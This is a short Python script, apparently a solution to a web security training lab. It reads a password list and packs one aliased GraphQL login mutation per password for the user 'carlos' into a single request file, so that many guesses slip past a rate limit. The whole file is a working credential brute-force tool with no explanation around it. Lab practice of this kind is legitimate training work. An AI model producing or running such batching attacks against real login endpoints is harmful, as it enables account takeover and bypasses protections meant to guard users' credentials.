#!/env/python3

mutation_template = '{"query":"mutation {\\n  %login_template% \\n}"}'
login_template = 'login%n%: login(input: %input%) {\\n    token\\n    success \\n}'
variables_template = '{username:\\"carlos\\",password:\\"%p%\\"}'


logins = []
with open('passwords.txt','r') as f:
    for n, p in enumerate(f.readlines()):
        p = p.strip()
        logins.append(login_template.replace("%n%", str(n)).replace("%input%", variables_template.replace("%p%", p)))


with open('graphql-ratelimit.txt','w') as f:
    f.write(mutation_template.replace("%login_template%", ",".join(logins)))



